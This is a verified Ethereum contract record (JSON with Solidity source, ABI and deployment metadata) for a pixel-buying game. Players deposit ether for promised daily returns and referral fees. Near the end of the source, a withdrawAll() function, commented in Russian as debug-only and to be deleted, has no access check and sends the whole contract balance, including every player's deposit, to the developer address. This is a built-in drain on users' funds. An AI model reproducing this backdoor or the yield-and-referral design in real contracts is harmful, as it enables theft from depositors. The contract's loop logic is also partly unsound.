{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Game {\r\n    using SafeMath for uint256;\r\n\r\n    event eventGetMonitor(address indexed userAddress, uint256 timestamp);\r\n    event eventDeposit(uint256 amount, address indexed userAddress, uint256 timestamp);\r\n    event eventBuyPixels(uint8 pixelType, uint256 numberOfPixels, address indexed userAddress, uint256 timestamp);\r\n    event eventCollectProfits(uint256 amount, address indexed userAddress, uint256 timestamp);\r\n    event eventWithdrawBalance(uint256 amount, address indexed userAddress, uint256 timestamp);\r\n\r\n    struct UserInfo {\r\n        address referral;\r\n        uint256 referralsCounter;\r\n        uint256 referralsProfit;\r\n        uint256 balance;\r\n        bool hasMonitor;\r\n        uint256 lastClaimTimestamp;\r\n        uint256[5] reinvestedPixels;\r\n        Pixel[] pixels;\r\n    }\r\n\r\n    struct Pixel {\r\n        uint8 pixelTypeIndex;\r\n        uint256 purchaseTimestamp;\r\n        uint256 lastClaimTimestamp;\r\n        uint256 accumulatedProfit;\r\n        bool active;\r\n        bool gift;\r\n    }\r\n\r\n\r\n    uint256 constant private _NOT_ENTERED = 1;\r\n    uint256 constant private _ENTERED = 2;\r\n    uint256 private _status;\r\n\r\n    uint256 public numberOfPlayers; // \u0412\u0441\u0435\u0433\u043e \u0438\u0433\u0440\u043e\u043a\u043e\u0432\r\n    uint256 public pixelsBuy; // \u0412\u0441\u0435\u0433\u043e \u043a\u0443\u043f\u0438\u043b\u0438 \u0438 \u0440\u0435\u0438\u043d\u0432\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043b\u0438 \u043f\u0438\u043a\u0441\u0435\u043b\u0435\u0439\r\n    uint256 public totalBalance; // \u041e\u0431\u0449\u0438\u0439 \u0431\u0430\u043b\u0430\u043d\u0441\r\n\r\n    uint256 constant private ONE_DAY = 86400; // 1 day\r\n    uint256 constant private PIXEL_GIFT = 15; // 6.66%\r\n    // uint256[] private PIXEL_PRICE =  [1, 10, 100, 1000, 10]; // \u0426\u0435\u043d\u044b\r\n    // uint256[] private PIXEL_PROFIT = [150, 160, 180, 210, 5005550]; // \u041f\u0440\u043e\u0446\u0435\u043d\u0442\u044b \u0432 \u0434\u0435\u043d\u044c\r\n    uint256[] private PIXEL_PRICE =  [1, 10, 100, 1000, 10000]; // \u0426\u0435\u043d\u044b\r\n    uint256[] private PIXEL_PROFIT = [150, 160, 180, 210, 250]; // \u041f\u0440\u043e\u0446\u0435\u043d\u0442\u044b \u0432 \u0434\u0435\u043d\u044c\r\n    uint256 private multi = 4e9;\r\n    address private devAddress;\r\n\r\n\r\n    mapping(address => UserInfo) private users;\r\n\r\n\r\n    constructor(address _devAddress) {\r\n        _status = _NOT_ENTERED;\r\n        devAddress = _devAddress;\r\n        users[msg.sender].hasMonitor = false;\r\n        users[msg.sender].reinvestedPixels = [0, 0, 0, 0, 0];\r\n    }\r\n\r\n\r\n    modifier nonReentrant() {\r\n        _nonReentrantBefore();\r\n        _;\r\n        _nonReentrantAfter();\r\n    }\r\n\r\n    modifier hasMonitor() {\r\n        require(users[msg.sender].hasMonitor, \"You need to purchase a monitor first\");\r\n        _;\r\n    }\r\n\r\n    modifier onlyUser {\r\n        require(msg.sender == tx.origin);\r\n        _;\r\n    }\r\n\r\n\r\n\r\n    function _nonReentrantBefore() private {\r\n        require(_status != _ENTERED, \"ReentrancyGuard: reentrant call\");\r\n        _status = _ENTERED;\r\n    }\r\n    function _nonReentrantAfter() private {\r\n        _status = _NOT_ENTERED;\r\n    }\r\n    function _reentrancyGuardEntered() internal view returns (bool) {\r\n        return _status == _ENTERED;\r\n    }\r\n\r\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u043e\u043a\u0443\u043f\u043a\u0438 \u043c\u043e\u043d\u0438\u0442\u043e\u0440\u0430\r\n    function getMonitor(address referral) external nonReentrant onlyUser {\r\n        require(!users[msg.sender].hasMonitor, \"Monitor already purchased\");\r\n\r\n        // \u0423\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0440\u0435\u0444\u0435\u0440\u0430\u043b\u0430 \u0432 \u0430\u0434\u0440\u0435\u0441 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a\u0430, \u0435\u0441\u043b\u0438 \u043e\u043d \u043d\u0435 \u0443\u043a\u0430\u0437\u0430\u043d\r\n        referral = (referral == address(0) || referral == msg.sender) ? devAddress : referral;\r\n\r\n        // \u0415\u0441\u043b\u0438 \u0440\u0435\u0444\u0435\u0440\u0430\u043b \u043d\u0435 \u043a\u0443\u043f\u0438\u043b \u043a\u0430\u043a \u043c\u0438\u043d\u0438\u043c\u0443\u043c \u043e\u0434\u0438\u043d \u043f\u0438\u043a\u0441\u0435\u043b\u044c, \u0442\u043e \u0440\u0435\u0444\u0435\u0440\u0430\u043b\u043e\u043c \u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u0441\u044f \u0432\u043b\u0430\u0434\u0435\u043b\u0435\u0446\r\n        if (users[referral].pixels.length == 0 || !hasActivePixels(referral)) { referral = devAddress; }\r\n\r\n        users[msg.sender].hasMonitor = true;\r\n        users[msg.sender].referral = referral;\r\n        users[referral].referralsCounter = users[referral].referralsCounter.add(1);\r\n        numberOfPlayers = numberOfPlayers.add(1);\r\n        emit eventGetMonitor(msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    function deposit() external payable nonReentrant onlyUser hasMonitor {\r\n        require(msg.value > 0, \"You must send some ether to deposit.\");\r\n        // 100*1000000 Hz = 0.004 ether\r\n        users[msg.sender].balance = users[msg.sender].balance.add(msg.value.div(multi));\r\n        emit eventDeposit(msg.value, msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u043e\u043a\u0443\u043f\u043a\u0438 \u043f\u0438\u043a\u0441\u0435\u043b\u044f \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0433\u043e \u0442\u0438\u043f\u0430 \u0441 \u0438\u0433\u0440\u043e\u0432\u043e\u0433\u043e \u0441\u0447\u0451\u0442\u0430\r\n    function buyPixels(uint8 pixelTypeIndex, uint256 numberOfPixels) external nonReentrant onlyUser hasMonitor {\r\n        require(pixelTypeIndex < PIXEL_PRICE.length, \"Invalid pixel type index\");\r\n        require(numberOfPixels > 0, \"Number of pixels must be greater than 0\");\r\n\r\n        UserInfo storage user = users[msg.sender];\r\n\r\n        // \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u0441\u0442\u043e\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u0438\u043a\u0441\u0435\u043b\u0435\u0439\r\n        uint256 totalCost = PIXEL_PRICE[pixelTypeIndex].mul(numberOfPixels).mul(1000000);\r\n\r\n        // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u0447\u0442\u043e \u0443 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0434\u043e\u0441\u0442\u0430\u0442\u043e\u0447\u043d\u043e \u0441\u0440\u0435\u0434\u0441\u0442\u0432 \u043d\u0430 \u0438\u0433\u0440\u043e\u0432\u043e\u043c \u0441\u0447\u0435\u0442\u0435\r\n        require(user.balance >= totalCost, \"Insufficient balance\");\r\n\r\n        // \u0412\u044b\u043f\u043b\u0430\u0447\u0438\u0432\u0430\u0435\u043c \u0440\u0435\u0444\u0435\u0440\u0430\u043b\u044c\u043d\u044b\u0435\r\n        payReferral(msg.sender, totalCost);\r\n\r\n        if (user.pixels.length == 0) {\r\n            user.lastClaimTimestamp = block.timestamp;\r\n        }\r\n\r\n        // \u041e\u0431\u043d\u043e\u0432\u043b\u044f\u0435\u043c \u0431\u0430\u043b\u0430\u043d\u0441 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u043d\u0430 \u0438\u0433\u0440\u043e\u0432\u043e\u043c \u0441\u0447\u0435\u0442\u0435\r\n        user.balance = user.balance.sub(totalCost);\r\n        totalBalance = totalBalance.add(totalCost);\r\n\r\n        // \u041a\u0430\u0436\u0434\u044b\u0439 PIXEL_GIFT \u043f\u0438\u043a\u0441\u0435\u043b\u044c \u0432 \u043f\u043e\u0434\u0430\u0440\u043e\u043a\r\n        // \u0418\u0449\u0435\u043c \u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0440\u0430\u0437 \u0431\u0443\u0434\u0435\u0442 \u043d\u0430\u0447\u0438\u0441\u043b\u0435\u043d \u0431\u043e\u043d\u0443\u0441\u043d\u044b\u0439 \u043f\u0438\u043a\u0441\u0435\u043b\u044c\r\n        uint256 tmpCounter = ((user.reinvestedPixels[pixelTypeIndex].add(numberOfPixels).add(PIXEL_GIFT)) / PIXEL_GIFT).sub((user.reinvestedPixels[pixelTypeIndex].add(PIXEL_GIFT)) / PIXEL_GIFT);\r\n        user.reinvestedPixels[pixelTypeIndex] = user.reinvestedPixels[pixelTypeIndex].add(numberOfPixels);\r\n        numberOfPixels = numberOfPixels.add(tmpCounter);\r\n\r\n        pixelsBuy = pixelsBuy.add(numberOfPixels);\r\n\r\n        // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043f\u0438\u043a\u0441\u0435\u043b\u0438 \u0438 \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0438\u0445 \u0432 \u043c\u0430\u0441\u0441\u0438\u0432 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n        for (uint256 i = 0; i < numberOfPixels; i++) {\r\n            // createPixel(pixelTypeIndex);\r\n            bool gift = (i < numberOfPixels.sub(tmpCounter)) ? false : true;\r\n            user.pixels.push(Pixel({\r\n                pixelTypeIndex: pixelTypeIndex,\r\n                purchaseTimestamp: block.timestamp,\r\n                lastClaimTimestamp: block.timestamp,\r\n                accumulatedProfit: 0,\r\n                active: true,\r\n                gift: gift\r\n            }));\r\n        }\r\n        emit eventBuyPixels(pixelTypeIndex, numberOfPixels, msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0441\u0431\u043e\u0440\u0430 \u043f\u0440\u0438\u0431\u044b\u043b\u0438 \u0441 \u043f\u0438\u043a\u0441\u0435\u043b\u0435\u0439\r\n    function collectProfits() external nonReentrant onlyUser hasMonitor {\r\n        Pixel storage pixel;\r\n        UserInfo storage user = users[msg.sender];\r\n        \r\n        uint256 userPixelsLength = user.pixels.length;\r\n        uint256 totalAmount = 0;\r\n\r\n        // \u041f\u0440\u043e\u0445\u043e\u0434\u0438\u043c \u043f\u043e \u0432\u0441\u0435\u043c \u043f\u0438\u043a\u0441\u0435\u043b\u044f\u043c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n        for (uint256 i = 0; i < userPixelsLength; i++) {\r\n            pixel = user.pixels[i];\r\n\r\n            // \u041f\u0438\u043a\u0441\u0435\u043b\u044c \u0443\u0436\u0435 \u0441\u0433\u043e\u0440\u0435\u043b\r\n            if (!pixel.active) { continue; }\r\n\r\n            // \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0432\u0440\u0435\u043c\u044f \u0436\u0438\u0437\u043d\u0438 \u043f\u0438\u043a\u0441\u0435\u043b\u044f (200% \u043f\u0440\u0438\u0431\u044b\u043b\u0438)\r\n            uint256 maxLifeSeconds = ONE_DAY.mul(20000).div(PIXEL_PROFIT[pixel.pixelTypeIndex]);\r\n            uint256 lifeEnd = pixel.purchaseTimestamp.add(maxLifeSeconds);\r\n\r\n            uint256 profitTime;\r\n            // \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u043c \u0444\u0430\u043a\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u0432\u0440\u0435\u043c\u044f \u0434\u043b\u044f \u0440\u0430\u0441\u0447\u0435\u0442\u0430 \u043f\u0440\u0438\u0431\u044b\u043b\u0438 (\u043c\u0438\u043d\u0438\u043c\u0443\u043c \u043c\u0435\u0436\u0434\u0443 24 \u0447\u0430\u0441\u0430\u043c\u0438 \u0438 \u043f\u0440\u043e\u0448\u0435\u0434\u0448\u0438\u043c \u0432\u0440\u0435\u043c\u0435\u043d\u0435\u043c)\r\n            if (block.timestamp > lifeEnd) {\r\n                // \u0415\u0441\u043b\u0438 \u043f\u0438\u043a\u0441\u0435\u043b\u044c \u0441\u0433\u043e\u0440\u0435\u043b\r\n                pixel.active = false;\r\n                profitTime = lifeEnd.sub(pixel.lastClaimTimestamp);\r\n            } else {\r\n                // \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043f\u0440\u043e\u0448\u0435\u0434\u0448\u0435\u0435 \u0432\u0440\u0435\u043c\u044f \u0441 \u043c\u043e\u043c\u0435\u043d\u0442\u0430 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e \u0441\u0431\u043e\u0440\u0430 \u043f\u0440\u0438\u0431\u044b\u043b\u0438 (\u0432 \u0441\u0435\u043a\u0443\u043d\u0434\u0430\u0445)\r\n                uint256 timeSinceLastClaim = block.timestamp.sub(pixel.lastClaimTimestamp);\r\n                profitTime = (timeSinceLastClaim < ONE_DAY) ? timeSinceLastClaim : ONE_DAY;\r\n            }\r\n\r\n            // \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043f\u0440\u0438\u0431\u044b\u043b\u044c \u0434\u043b\u044f \u0434\u0430\u043d\u043d\u043e\u0433\u043e \u043f\u0435\u0440\u0438\u043e\u0434\u0430 (\u0441 \u0443\u0447\u0435\u0442\u043e\u043c \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u0430)\r\n            uint256 profitAmount = PIXEL_PRICE[pixel.pixelTypeIndex].mul(1000000);\r\n            profitAmount = profitAmount.mul(2).mul(profitTime).div(maxLifeSeconds).add(3);\r\n            pixel.accumulatedProfit = pixel.accumulatedProfit.add(profitAmount);\r\n\r\n            // \u041e\u0431\u043d\u043e\u0432\u043b\u044f\u0435\u043c \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e \u043c\u0435\u0442\u043a\u0443 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0433\u043e \u0441\u0431\u043e\u0440\u0430 \u043f\u0440\u0438\u0431\u044b\u043b\u0438\r\n            pixel.lastClaimTimestamp = block.timestamp;\r\n\r\n            // \u041e\u0431\u043d\u043e\u0432\u043b\u044f\u0435\u043c \u0431\u0430\u043b\u0430\u043d\u0441 \u0438\u0433\u0440\u043e\u0432\u043e\u0433\u043e \u0441\u0447\u0435\u0442\u0430 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n            user.balance = user.balance.add(profitAmount);\r\n\r\n            totalAmount = totalAmount.add(profitAmount);\r\n        }\r\n\r\n        user.lastClaimTimestamp = block.timestamp;\r\n\r\n        emit eventCollectProfits(totalAmount, msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0432\u044b\u0432\u043e\u0434\u0430 \u043f\u0440\u0438\u0431\u044b\u043b\u0438 \u0441 \u043f\u0438\u043a\u0441\u0435\u043b\u0435\u0439 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044e\r\n    function withdrawBalance(uint256 amount) external nonReentrant onlyUser hasMonitor {\r\n        // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u0447\u0442\u043e \u043d\u0430 \u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u0435 \u0435\u0441\u0442\u044c \u0441\u0440\u0435\u0434\u0441\u0442\u0432\u0430\r\n        require(address(this).balance > 0, \"Contract has no balance\");\r\n\r\n        // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u0447\u0442\u043e \u0443 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0435\u0441\u0442\u044c \u0431\u0430\u043b\u0430\u043d\u0441 \u0434\u043b\u044f \u0432\u044b\u0432\u043e\u0434\u0430\r\n        require(users[msg.sender].balance > 0, \"No balance to withdraw\");\r\n\r\n        // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0431\u0430\u043b\u0430\u043d\u0441 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n        uint256 balanceToWithdraw = (users[msg.sender].balance >= amount) ? amount : users[msg.sender].balance;\r\n\r\n        // \u041e\u0431\u043d\u043e\u0432\u043b\u044f\u0435\u043c \u0431\u0430\u043b\u0430\u043d\u0441 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n        users[msg.sender].balance = users[msg.sender].balance.sub(balanceToWithdraw);\r\n\r\n        // \u041f\u0435\u0440\u0435\u0432\u043e\u0434\u0438\u043c \u0441\u0440\u0435\u0434\u0441\u0442\u0432\u0430 \u043d\u0430 \u0430\u0434\u0440\u0435\u0441 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\r\n        payable(msg.sender).transfer(balanceToWithdraw.mul(multi));\r\n        emit eventWithdrawBalance(balanceToWithdraw, msg.sender, block.timestamp);\r\n    }\r\n\r\n\r\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044e \u0434\u043b\u044f \u043d\u0430\u0447\u0438\u0441\u043b\u0435\u043d\u0438\u044f \u0440\u0435\u0444\u0435\u0440\u0430\u043b\u044c\u043d\u044b\u0445 \u043a\u043e\u043c\u0438\u0441\u0441\u0438\u0439\r\n    function payReferral(address userAddress, uint256 amount) private {\r\n        payable(devAddress).transfer(amount.mul(multi).mul(5).div(100));\r\n\r\n        address referral = users[userAddress].referral;\r\n        uint256 referralFee = amount.mul(5).div(100);\r\n        users[referral].referralsProfit = users[referral].referralsProfit.add(referralFee);\r\n        users[referral].balance = users[referral].balance.add(referralFee);\r\n    }\r\n\r\n\r\n    function getUsersInfo(address[] memory userAddresses) external view returns (UserInfo[] memory) {\r\n        uint256 numberOfUsers = userAddresses.length;\r\n        UserInfo[] memory usersInfo = new UserInfo[](numberOfUsers);\r\n        for (uint256 i = 0; i < numberOfUsers; i++) {\r\n            usersInfo[i] = users[userAddresses[i]];\r\n        }\r\n        return usersInfo;\r\n    }\r\n\r\n\r\n    function getUserInfo(address userAddress) external view returns(UserInfo memory) {\r\n        return users[userAddress];\r\n    }\r\n\r\n\r\n    function hasActivePixels(address userAddress) private view returns (bool) {\r\n        UserInfo memory user = users[userAddress];\r\n        for (uint256 i = uint256(user.pixels.length)-1; i >= 0; i--) {\r\n            if (user.pixels[i].active) {\r\n                return true;\r\n            }\r\n        }\r\n        return false;\r\n    }\r\n\r\n\r\n    // \u0423\u0414\u0410\u041b\u0418\u0422\u042c (\u0422\u041e\u041b\u042c\u041a\u041e \u0414\u041b\u042f \u041e\u0422\u041b\u0410\u0414\u041a\u0418) !!!!!!!!!!!!!!!!!!!!!!!\r\n    // \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0438\u0437\u044a\u044f\u0442\u0438\u044f \u0432\u0441\u0435\u0445 \u0441\u0440\u0435\u0434\u0441\u0442\u0432 \u0438\u0437 \u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u0430\r\n    function withdrawAll() external {\r\n        uint256 contractBalance = address(this).balance; // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0431\u0430\u043b\u0430\u043d\u0441 \u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u0430\r\n        require(contractBalance > 0, \"Contract has no balance\"); // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u0447\u0442\u043e \u043d\u0430 \u043a\u043e\u043d\u0442\u0440\u0430\u043a\u0442\u0435 \u0435\u0441\u0442\u044c \u0441\u0440\u0435\u0434\u0441\u0442\u0432\u0430\r\n        payable(devAddress).transfer(contractBalance); // \u041f\u0435\u0440\u0435\u0432\u043e\u0434\u0438\u043c \u0432\u0441\u0435 \u0441\u0440\u0435\u0434\u0441\u0442\u0432\u0430 \u043d\u0430 \u043a\u043e\u0448\u0435\u043b\u0435\u043a \u0432\u043b\u0430\u0434\u0435\u043b\u044c\u0446\u0430\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0);\r\n        return a % b;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_devAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"pixelType\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"numberOfPixels\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventBuyPixels\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventCollectProfits\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventGetMonitor\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"timestamp\",\"type\":\"uint256\"}],\"name\":\"eventWithdrawBalance\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"pixelTypeIndex\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"numberOfPixels\",\"type\":\"uint256\"}],\"name\":\"buyPixels\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"collectProfits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"}],\"name\":\"getMonitor\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserInfo\",\"outputs\":[{\"components\":[{\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"referralsCounter\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"referralsProfit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"hasMonitor\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"lastClaimTimestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256[5]\",\"name\":\"reinvestedPixels\",\"type\":\"uint256[5]\"},{\"components\":[{\"internalType\":\"uint8\",\"name\":\"pixelTypeIndex\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"purchaseTimestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lastClaimTimestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"accumulatedProfit\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"active\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"gift\",\"type\":\"bool\"}],\"internalType\":\"struct Game.Pixel[]\",\"name\":\"pixels\",\"type\":\"tuple[]\"}],\"internalType\":\"struct Game.UserInfo\",\"name\":\"\",\"type\":\"tuple\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"userAddresses\",\"type\":\"address[]\"}],\"name\":\"getUsersInfo\",\"outputs\":[{\"components\":[{\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"referralsCounter\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"referralsProfit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"hasMonitor\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"lastClaimTimestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256[5]\",\"name\":\"reinvestedPixels\",\"type\":\"uint256[5]\"},{\"components\":[{\"internalType\":\"uint8\",\"name\":\"pixelTypeIndex\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"purchaseTimestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lastClaimTimestamp\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"accumulatedProfit\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"active\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"gift\",\"type\":\"bool\"}],\"internalType\":\"struct Game.Pixel[]\",\"name\":\"pixels\",\"type\":\"tuple[]\"}],\"internalType\":\"struct Game.UserInfo[]\",\"name\":\"\",\"type\":\"tuple[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"numberOfPlayers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pixelsBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawAll\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Game", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000fd78b999bd91c5cf7561e240af472534c8c7a23e", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a9d1ae703c04ce3d55e4c7a498486ba632e19be6b9099bdf161e7f5005b338df"}